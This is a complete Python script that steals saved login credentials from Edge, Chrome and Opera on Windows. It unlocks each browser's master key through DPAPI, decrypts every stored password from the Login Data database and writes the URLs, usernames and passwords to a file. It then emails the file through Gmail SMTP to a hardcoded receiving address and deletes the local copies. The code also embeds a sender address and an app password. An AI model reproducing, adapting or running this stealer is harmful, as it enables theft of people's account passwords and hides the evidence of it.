

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
def send_mail(filepath):
    # Email configuration
    sender_email = "priyamtomar012@gmail.com"
    receiver_email = "priyamtomar133@gmail.com"
    subject = "Test Email with Attachment"
    body = "This is a test email sent from Python with an attachment."

    # SMTP server settings (Gmail in this example)
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = sender_email
    smtp_password = "eringqypeskdrxyp"

    # File to attach
    attachment_file = filepath

    # Create a message container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Add body to the email
    msg.attach(MIMEText(body, 'plain'))

    # Add attachment to the email
    with open(attachment_file, "rb") as f:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{attachment_file}"')
        msg.attach(part)

    # Connect to the SMTP server
    smtp = smtplib.SMTP(smtp_server, smtp_port)
    smtp.starttls()
    smtp.login(smtp_username, smtp_password)

    # Send the email
    smtp.sendmail(sender_email, receiver_email, msg.as_string())

    # Disconnect from the SMTP server
    smtp.quit()

    print("Email sent successfully.")

def get_master_key(path):
    with open(os.environ['USERPROFILE'] + os.sep + path, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"

def write(filename,content):
    with open(filename,'a+',encoding='utf-8') as f:
        f.write(content)
        f.close()

def FullControls(paths):
    master_key = get_master_key(paths)
    logindata = "\\".join(paths.split("\\")[0:-2])
    login_db = os.environ['USERPROFILE'] + os.sep + f'{logindata}\\default\\Login Data'
    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    filenme = paths.split('\\')[6]
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username and decrypted_password:
                write(f"{filenme}.txt","URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        send_mail(f"{filenme}.txt")
        os.remove("Loginvault.db")
        os.remove(f"{filenme}.txt")
    except Exception as e:
        pass

if __name__ == '__main__':
    paths = r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State'
    FullControls(paths)
    paths = r'AppData\\Local\\Google\\Chrome\\User Data\\Local State'
    FullControls(paths)
    paths = r'AppData\\roaming\\Opera Software\\Opera Stable\\Local State'
    FullControls(paths)